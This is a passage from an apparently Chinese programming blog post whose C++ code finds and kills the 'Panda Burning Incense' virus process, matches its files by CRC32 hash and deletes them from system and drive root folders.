crcTmp2 = ((crcTmp2&gt;&gt;<span class="number">8</span>) &amp; <span class="number">0x00FFFFFF</span>) ^ crcTable[ (crcTmp2^(*ptr)) &amp; <span class="number">0xFF</span> ];</span><br><span class="line">        ptr++;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> (crcTmp2^<span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数的参数有两个，一个是指向缓冲区的指针，第二个是缓冲区的长度。它将文件全部读入缓冲区中，然后用CRC32函数计算文件的CRC32散列值，可以得到我所研究的“熊猫烧香”病毒的散列值，不同版本的病毒的散列值是不同的。<br>我们需要在内存中查找病毒是否存在，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FindTargetProcess</span><span class="params">(<span class="keyword">char</span> *pszProcessName,DWORD *dwPid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bFind = FALSE;</span><br><span class="line">    </span><br><span class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> bFind;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    PROCESSENTRY32 pe = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line">    </span><br><span class="line">    BOOL bRet = Process32First(hProcessSnap,&amp;pe);</span><br><span class="line">    <span class="keyword">while</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (lstrcmp(pe.szExeFile,pszProcessName) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *dwPid = pe.th32ProcessID;</span><br><span class="line">            bFind = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = Process32Next(hProcessSnap,&amp;pe);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> bFind;</span><br><span class="line">&#125;</span><br><span class="line">还需要提升系统的权限，提升成功后，当前进程就可以访问一些受限的系统资源。代码如下：</span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">(<span class="keyword">char</span> *pszPrivilege)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hToken = INVALID_HANDLE_VALUE;</span><br><span class="line">    LUID luid;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line"> </span><br><span class="line">    BOOL bRet = OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&amp;hToken);</span><br><span class="line">    <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> bRet;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    bRet = LookupPrivilegeValue(<span class="literal">NULL</span>,pszPrivilege,&amp;luid);</span><br><span class="line">    <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> bRet;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"> </span><br><span class="line">    bRet = AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="keyword">sizeof</span>(tp),<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>病毒会在所有盘符下面的非系统目录中创建名为Desktop_.ini的文件，应当将其删除。<br>历整个磁盘的文件，这需要使用FindFirstFile()与FindNextFile()这两个API函数，并采用递归调用的方法；另一个是修改文件属性，因为病毒创建出来的文件会带有系统、只读和隐藏这三个属性，若不对其进行更改，是无法删除病毒文件的。依照这个思想，编写代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">FindFiles</span><span class="params">(LPVOID lpszPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        WIN32_FIND_DATA stFindFile;</span><br><span class="line">        HANDLE hFindFile;</span><br><span class="line"><span class="comment">// 扫描路径</span></span><br><span class="line"><span class="keyword">char</span> szPath[MAX_PATH];    </span><br><span class="line"><span class="keyword">char</span> szFindFile[MAX_PATH];</span><br><span class="line"><span class="keyword">char</span> szSearch[MAX_PATH];</span><br><span class="line"><span class="keyword">char</span> *szFilter;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">szFilter = <span class="string">"*.*"</span>;</span><br><span class="line">lstrcpy(szPath, (<span class="keyword">char</span> *)lpszPath);</span><br><span class="line"> </span><br><span class="line">len = lstrlen(szPath);</span><br><span class="line"><span class="keyword">if</span>(szPath[len<span class="number">-1</span>] != <span class="string">'\\'</span>)</span><br><span class="line">&#123;</span><br><span class="line">szPath[len] = <span class="string">'\\'</span>;</span><br><span class="line">szPath[len+<span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">lstrcpy(szSearch, szPath);</span><br><span class="line">lstrcat(szSearch,szFilter);</span><br><span class="line"> </span><br><span class="line">hFindFile = FindFirstFile(szSearch, &amp;stFindFile);</span><br><span class="line"><span class="keyword">if</span>(hFindFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    lstrcpy(szFindFile, szPath);</span><br><span class="line">                    lstrcat(szFindFile, stFindFile.cFileName);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(stFindFile.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(stFindFile.cFileName[<span class="number">0</span>] != <span class="string">'.'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    FindFiles(szFindFile);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!lstrcmp(stFindFile.cFileName,<span class="string">"Desktop_.ini"</span>))</span><br><span class="line">&#123;</span><br><span class="line">                                    <span class="comment">// 去除文件的隐藏、系统以及只读属性</span></span><br><span class="line">                                    DWORD dwFileAttributes = GetFileAttributes(szFindFile);</span><br><span class="line">                                    dwFileAttributes &amp;= ~FILE_ATTRIBUTE_HIDDEN;</span><br><span class="line">                                    dwFileAttributes &amp;= ~FILE_ATTRIBUTE_SYSTEM;</span><br><span class="line">                                    dwFileAttributes &amp;= ~FILE_ATTRIBUTE_READONLY;</span><br><span class="line">                                    SetFileAttributes(szFindFile, dwFileAttributes);</span><br><span class="line">                                    <span class="comment">// 删除Desktop_.ini</span></span><br><span class="line">                                    BOOL bRet = DeleteFile(szFindFile);</span><br><span class="line">                                    csTxt += szFindFile;</span><br><span class="line">                                    <span class="keyword">if</span> (bRet)</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        csTxt += _T(<span class="string">"被删除！\r\n"</span>);</span><br><span class="line">                                    &#125; </span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                    &#123;</span><br><span class="line">                                        csTxt += _T(<span class="string">"无法删除\r\n"</span>);</span><br><span class="line">                                    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ret = FindNextFile(hFindFile, &amp;stFindFile);</span><br><span class="line">&#125;<span class="keyword">while</span>(ret != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">FindClose(hFindFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> CKillWhBoyDlg::OnBtnKill() </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    DWORD dwPid = <span class="number">0</span>; </span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//  结束spoclsv.exe进程，并删除病毒程序本身</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line">    bRet = FindTargetProcess(<span class="string">"spoclsv.exe"</span>, &amp;dwPid);</span><br><span class="line">    <span class="keyword">if</span> (bRet == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        csTxt = _T(<span class="string">"检查系统内存...\r\n"</span>);</span><br><span class="line">        csTxt += _T(<span class="string">"系统中存在病毒进程:spoclsv.exe\r\n"</span>);</span><br><span class="line">        csTxt += _T(<span class="string">"准备进行查杀...\r\n"</span>);</span><br><span class="line">        SetDlgItemText(IDC_LIST,csTxt);   </span><br><span class="line">        <span class="comment">// 提升权限</span></span><br><span class="line">        bRet = EnableDebugPrivilege(SE_DEBUG_NAME);</span><br><span class="line">        <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"提升权限失败\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"提升权限成功！\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">        <span class="comment">// 打开并尝试结束病毒进程</span></span><br><span class="line">        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPid);</span><br><span class="line">        <span class="keyword">if</span> (hProcess == INVALID_HANDLE_VALUE)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"无法结束病毒进程\r\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = TerminateProcess(hProcess,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"无法结束病毒进程\r\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        csTxt += _T(<span class="string">"病毒进程已经结束\r\n"</span>);</span><br><span class="line">        SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"系统中不存在spoclsv.exe病毒进程\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    Sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 查杀磁盘中是否存在名为spoclsv.exe的病毒文件</span></span><br><span class="line">    <span class="keyword">char</span> szSysPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    GetSystemDirectory(szSysPath,MAX_PATH);</span><br><span class="line">    </span><br><span class="line">    lstrcat(szSysPath,<span class="string">"\\drivers\\spoclsv.exe"</span>);</span><br><span class="line"> </span><br><span class="line">    csTxt += _T(<span class="string">"检查硬盘中是否存在spoclsv.exe文件...\r\n"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (GetFileAttributes(szSysPath) == <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"spoclsv.exe病毒文件不存在\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"spoclsv.exe病毒文件存在，正在计算散列值\r\n"</span>);</span><br><span class="line"> </span><br><span class="line">        HANDLE hFile = CreateFile(szSysPath,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        &#123;</span><br><span class="line">            AfxMessageBox(<span class="string">"Create Error"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        DWORD dwSize = GetFileSize(hFile,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (dwSize == <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            AfxMessageBox(<span class="string">"GetFileSize Error"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        BYTE *pFile = (BYTE*)<span class="built_in">malloc</span>(dwSize);</span><br><span class="line">        <span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            AfxMessageBox(<span class="string">"malloc Error"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        ReadFile(hFile,pFile,dwSize,&amp;dwNum,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 计算spoclsv.exe的散列值</span></span><br><span class="line">        DWORD dwCrc32 = CRC32(pFile,dwSize);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (pFile != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(pFile);</span><br><span class="line">            pFile = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="comment">// 0x89240FCD是“熊猫烧香”病毒的散列值</span></span><br><span class="line">        <span class="keyword">if</span> (dwCrc32 != <span class="number">0x89240FCD</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"spoclsv.exe校验和验证失败\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"spoclsv.exe校验和验证成功，正在删除...\r\n"</span>);</span><br><span class="line">            <span class="comment">// 去除文件的隐藏、系统以及只读属性</span></span><br><span class="line">            DWORD dwFileAttributes = GetFileAttributes(szSysPath);</span><br><span class="line">            dwFileAttributes &amp;= ~FILE_ATTRIBUTE_HIDDEN;</span><br><span class="line">            dwFileAttributes &amp;= ~FILE_ATTRIBUTE_SYSTEM;</span><br><span class="line">            dwFileAttributes &amp;= ~FILE_ATTRIBUTE_READONLY;</span><br><span class="line">            SetFileAttributes(szSysPath, dwFileAttributes);</span><br><span class="line">            <span class="comment">// 删除spoclsv.exe</span></span><br><span class="line">            bRet = DeleteFile(szSysPath);</span><br><span class="line">            <span class="keyword">if</span> (bRet)</span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"spoclsv.exe病毒被删除！\r\n"</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"spoclsv.exe病毒无法删除\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">    Sleep(<span class="number">10</span>);</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//  删除每个盘符下的setup.exe与autorun.inf，以及Desktop_.ini</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="keyword">char</span> szDriverString[MAXBYTE] = &#123; <span class="number">0</span> &#125;;  </span><br><span class="line">    <span class="keyword">char</span> *pTmp = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="comment">//获取字符串类型的驱动器列表  </span></span><br><span class="line">    GetLogicalDriveStrings(MAXBYTE, szDriverString);  </span><br><span class="line">  </span><br><span class="line">    pTmp = szDriverString;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span>( *pTmp )  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">char</span> szAutorunPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;    </span><br><span class="line">        <span class="keyword">char</span> szSetupPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        lstrcat(szAutorunPath,pTmp);</span><br><span class="line">        lstrcat(szAutorunPath,<span class="string">"autorun.inf"</span>);</span><br><span class="line">        lstrcat(szSetupPath,pTmp);</span><br><span class="line">        lstrcat(szSetupPath,<span class="string">"setup.exe"</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (GetFileAttributes(szSetupPath) == <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += pTmp;</span><br><span class="line">            csTxt += _T(<span class="string">"setup.exe病毒文件不存在\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += pTmp;</span><br><span class="line">            csTxt += _T(<span class="string">"setup.exe病毒文件存在，正在进行计算校验和...\r\n"</span>);</span><br><span class="line">            HANDLE hFile = CreateFile(szSetupPath,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">            &#123;</span><br><span class="line">                AfxMessageBox(<span class="string">"Create Error"</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            DWORD dwSize = GetFileSize(hFile,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (dwSize == <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                AfxMessageBox(<span class="string">"GetFileSize Error"</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            BYTE *pFile = (BYTE*)<span class="built_in">malloc</span>(dwSize);</span><br><span class="line">            <span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                AfxMessageBox(<span class="string">"malloc Error"</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;         </span><br><span class="line">           </span><br><span class="line">            DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">            ReadFile(hFile,pFile,dwSize,&amp;dwNum,<span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">            DWORD dwCrc32 = CRC32(pFile,dwSize);   </span><br><span class="line">            <span class="keyword">if</span> (pFile != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">free</span>(pFile);</span><br><span class="line">                pFile = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            CloseHandle(hFile);</span><br><span class="line">            <span class="keyword">if</span> (dwCrc32 != <span class="number">0x89240FCD</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"校验和验证失败\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span 